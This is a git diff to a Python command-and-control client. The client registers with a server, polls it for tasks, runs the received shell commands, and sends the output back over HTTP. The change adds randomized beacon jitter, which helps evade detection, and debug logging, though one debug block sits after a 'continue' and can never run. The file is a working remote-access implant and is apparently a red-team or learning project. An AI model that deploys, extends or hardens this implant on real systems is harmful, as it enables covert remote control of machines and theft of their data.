@@ -3,13 +3,16 @@ import socket
 import time
 import subprocess
 import platform
+import random
 
 class Client:
 
-    def __init__(self,server_ip, port=80,callback_interval=120):
+    def __init__(self,server_ip, port=80,callback_interval=120,jitter=5,debug=False):
         self.server_ip = server_ip
         self.port = port
         self.callback_interval = callback_interval
+        self.jitter = jitter
+        self.debug = debug
         if platform.system() == "Linux":
             self.local_ip = subprocess.run("hostname -I | awk '{print $1}'", shell=True, capture_output=True, text=True).stdout.strip()
         else:
@@ -27,7 +30,8 @@ class Client:
         try:
             task = task_json.get('action')
             task_id = task_json.get('task_id')
-            #print(task)
+            if self.debug:
+                print("Executing task:",task)
             if task == "command":
                 command = task_json.get('command')
                 if platform.system() == "Windows":
@@ -35,6 +39,8 @@ class Client:
                 else:
                     ps = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, check=True)
                 data = {'agent_id':self.local_ip,'task_id': task_id, 'result': ps.stdout,'returncode': ps.returncode}
+                if self.debug:
+                    print("Sending result back to server:",data)
                 req = requests.post(f"http://{self.server_ip}:{self.port}/results", json=data)
             elif task == "download":
                 pass
@@ -46,14 +52,25 @@ class Client:
         except Exception as e:
             pass
 
+    def sleep(self):
+        min_sleep = self.callback_interval - self.jitter
+        if min_sleep <= 0:
+            min_sleep = 1
+        max_sleep = self.callback_interval + self.jitter
+        time.sleep(random.randint(min_sleep,max_sleep))
+
     def run(self):
         while True:
             try:
                 self.register()
+                if self.debug:
+                    print("Registration successful")
                 break #Registration successful, move on to task retrieval
             except:
+                if self.debug:
+                    print("Registration failed")
                 #Registration failed, retrying
-                time.sleep(60)
+                self.sleep()
         while True:
             try:
                 req = requests.post(f"http://{self.server_ip}:{self.port}/tasks", json={'agent_id': self.local_ip}, timeout=10)
@@ -61,21 +78,23 @@ class Client:
                     self.register()
                     continue
                 if req.status_code not in [200, 201, 204]:
-                    time.sleep(self.callback_interval)
+                    self.sleep()
                     continue
                 elif req.status_code == 204:
-                    #print("No tasks")
-                    time.sleep(self.callback_interval)
+                    if self.debug:
+                        print("No tasks")
+                    self.sleep()
                     continue
                 tasks = req.json()
                 self.handle_task(tasks)
             except Exception as e:
-                time.sleep(self.callback_interval)
+                self.sleep()
                 continue
-                #print(e)
+                if self.debug:
+                    print(e)
 
 def main():
-    client = Client("127.0.0.1",callback_interval=15)
+    client = Client("127.0.0.1",callback_interval=15,jitter=7)
     client.run()
 
 if __name__ == '__main__':
